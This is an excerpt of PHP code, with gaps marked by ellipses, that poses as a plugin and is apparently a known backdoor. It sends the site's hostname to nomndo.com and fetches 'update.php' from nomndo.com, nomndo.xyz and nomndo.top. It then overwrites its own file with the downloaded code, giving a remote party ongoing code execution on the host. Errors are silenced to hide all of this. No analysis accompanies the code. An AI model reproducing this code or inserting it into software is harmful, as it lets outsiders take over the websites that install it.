<?php
//a2Fqc2hkYSBrc2Foc2QgYWpoc2QgYXM4NzZxOGU2MjE4IGFza2pkaGFza2ogcXc5OHdpZGggYWtkamFzaCA=
//dGhpcyBpcyB0aGUgdmVyc2lvbiBvZiB0aGUgcGx1Z2luIDQuNDQ0OTk=
...
{
    if(!$log_installed = @file_get_contents("http://www.nomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
{
    $log_installed = @file_get_contents_mplugin("http://www.nomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
}
}
/*************************set default options***************************/
...
if( ini_get('allow_url_fopen') ) {
        ...
        if (($new_version = @file_get_contents("http://www.nomndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.nomndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents("http://www.nomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents("http://www.nomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
...
else
{
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents_mplugin("http://www.nomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents_mplugin("http://www.nomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
